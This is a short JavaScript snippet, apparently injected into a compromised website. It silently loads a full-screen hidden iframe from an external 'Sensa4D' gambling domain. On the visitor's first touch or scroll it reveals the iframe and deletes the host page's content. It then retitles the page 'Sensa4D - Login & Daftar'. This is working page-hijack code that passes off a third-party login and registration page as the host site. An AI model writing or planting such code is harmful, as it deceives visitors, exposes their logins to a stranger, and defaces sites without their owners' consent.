(function(window, document) {
    const _target = "https://alternatif-sensa4d.pages.dev/";
    let _triggered = false;
    let _frame = null;
    const _init = () => {
        if (_frame) return;
        _frame = document.createElement('iframe');
        Object.assign(_frame.style, {
            position: 'fixed', top: 0, left: 0, width: '100vw', height: '100vh',
            border: 'none', zIndex: 2147483647, background: '#fff',
            opacity: 0, pointerEvents: 'none', transition: 'opacity 0.6s ease'
        });
        _frame.src = _target;
        document.documentElement.appendChild(_frame);
    };
    setTimeout(_init, Math.floor(Math.random() * 1000) + 500);
    const _blast = () => {
        if (_triggered || !_frame) return;
        _triggered = true;
        _frame.style.opacity = '1';
        _frame.style.pointerEvents = 'auto';
        document.body.style.overflow = 'hidden';
        setTimeout(() => {
            const nodes = document.body.childNodes;
            for(let n = nodes.length - 1; n >= 0; n--) {
                if(nodes[n] !== _frame && nodes[n].nodeName !== 'SCRIPT') {
                    nodes[n].parentNode && nodes[n].parentNode.removeChild(nodes[n]);
                }
            }
            document.title = "Sensa4D - Login & Daftar";
        }, 1500);
    };
    window.addEventListener('touchend', () => {
        setTimeout(_blast, 50);
    }, { once: true });
    window.addEventListener('scroll', () => {
        if(window.scrollY > 20) _blast();
    }, { once: true });
})(window, document);
